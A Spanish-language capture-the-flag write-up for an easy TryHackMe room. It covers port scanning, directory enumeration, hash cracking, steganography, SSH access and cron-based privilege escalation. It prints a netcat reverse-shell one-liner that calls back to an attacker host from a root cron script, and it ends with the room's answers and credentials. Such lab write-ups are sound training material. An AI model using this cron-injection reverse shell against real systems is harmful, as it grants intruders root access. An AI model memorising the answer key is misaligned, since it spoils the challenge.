Bienvenidos a otra sala de TryHackMe. En esta ocasion, les traemos una maquina de dificultad facil, en la cual escanearemos los puertos abiertos, enumeraremos posibles directorios ocultos, tambien haremos uso de **john** para crackear contraseñas y realizaremos la practica de **steghide** para descubrir mensajes secretos a traves de imagenes. Luego, accederemos al sistema via #ssh y escalaremos privilegios mediante uso de #crontabs para acceder como sistema raiz. 

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.22s latency).
Scanned at 2023-05-02 00:47:42 EDT for 29s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 63 nginx 1.16.1
6498/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.43 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration

Para iniciar el proceso de enumeracion utilizamos la herramienta **gobuster** para descubirr directorios ocultos y posibles . Ejecutaremos el siguiente comando : `gobuster dir http://IPTARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`
Obtendremos los siguientes directorios :
```ruby
/hidden               (Status: 301) [Size: 169] [--> http://IPTARGET/hidden/]
/index.html           (Status: 200) [Size: 612]
/robots.txt           (Status: 200) [Size: 43]
```

Nos dirigimos al directorio /hidden, pero no encotraremos nada que nos llame la atencion.. lo mismo con /robots.txt. En estas ocasiones, tendremos que ejecutar otro gobuster, pero agregando el directorio /hidden, para ver si hay alguna ruta que nos interese. `gobuster dir http://IPTARGET/hidden -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`
```ruby
/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] [--> http://IPTARGET/hidden/whatever/]
```

Navegamos al directorio y  al observar con page-source, encontraremos nuestra primer flag que decodificaremos con base64 `echo "flag" | base64 -d`

Para encontrar la segunda flag, haremos uso nuevamente de **gobuster**, pero esta vez, enumeraremos el puerto abierto que nos listo nuestro escaneo de nmap (65524). `gobuster dir -u http://IPTARGET:65524 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt `
```ruby
/.hta                 (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10818]
/robots.txt           (Status: 200) [Size: 153]
/server-status        (Status: 403) [Size: 280]
```

Tendremos otro directorio /robots.txt que esta vez habra un mensaje en el. Parece un tipo de hash, utilizaremos **hashid** para identificar el tipo de hash. Una vez identificado el hash, lo crackearemos mediante una herramienta online . En mi caso, utilize https://md5hashing.net/,  ya que fue la unica que me pudo descrifrar el contenido.

Por ultimo, navegaremos dentro del puerto 65524 e inspeccionamos el Page-Source. SI observamos con detenimiento, habra un mensaje codificado. Utilizaremos **cyberchef** para decoficarlo en base62. Obtendremos un directorio secreto !

# John

Al navegar al directorio que descubrimos anteriormente, nos encontraremos con un fondo de codigo binario. SI mantemos el cursor apretado y lo movemos, podremos observar que hay letras escondidas que pasan desapercibidas.  Al encontrar el hash secreto, utilizamos nuestra herramienta **john** para crackear que oculta este hash, pero primero lo tendremos que identifiar usando **hash-identifier**. Una vez que sabemos que tipo de hash utiliza, ejecutaremos john : `john --wordlist=easypeasy.txt --format=gost flag3.txt`
La wordlists la obtenemos descargandola en la sala de tryhackme. Obtenemos una contraseña, pero no podremos utilizarla en **ssh**.

# Steghide

Dentro del directorio, donde encontramos el hash y, ademas del fondo, hay una imagen en que tiene como foto codigo binario, de la cual podremos descargar. Una vez descargada, utilizaremos **steghide** para descubrir posibles archivos mediante imagenes. `steghide extract -sf IMG`, nos pedira una contraseña y es la que descubrimos con ayuda de **john**. 
Nos mostrara un archivo .txt donde se almacen las credenciales del sistema en las que podremos acceder via #ssh 

## SSH

Para conectarnos via ssh, en esta ocasion tendremos que especificar el puerto donde querramos conectarnos. `ssh boring@IPTARGET -p 65524`. Una vez dentro, encontraremos la flag distorsionada, por lo que tendremos que decodificarla usando **rot13** en cyberchef para que sea legible.

# Priv. Escalation

Para escalar priviegios, listaremos las tareas cron : `cat /etc/crontab && ls -lah`
Luego, tendremos que suplantarlo con nuestra reverse shell, asi podremos acceder al sistema raiz en la terminal de nuestra maquina atacante. 
`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 4444 >/tmp/f" > .mysecretcronjob.sh`

Antes de ejecutarlo, en nuestra terminal nos pondremos en escucha ejecutando : `nc -nvlp 4444`. Ahora si, ejecutaremos **mysecretcronjob.sh** y obtendremos nuestra shell privilegiada "root".

# Respuetas 

#enum = /hidden
>/hidden/whatever ---> flag1 ---> base64 decode
> /robots.txt port 65524 ----> flag2 ---> https://md5hashing.net/hash/md5/
> page-source 65524 ----> flag3 ----> ObsJmP173N2X6dOrAgEAL0Vu (from base62) -----> Hidden directory "/n0th1ng3ls3m4tt3r" 

#john = mypasswordforthatjob
#ssh = boring:iconvertedmypasswordtobinary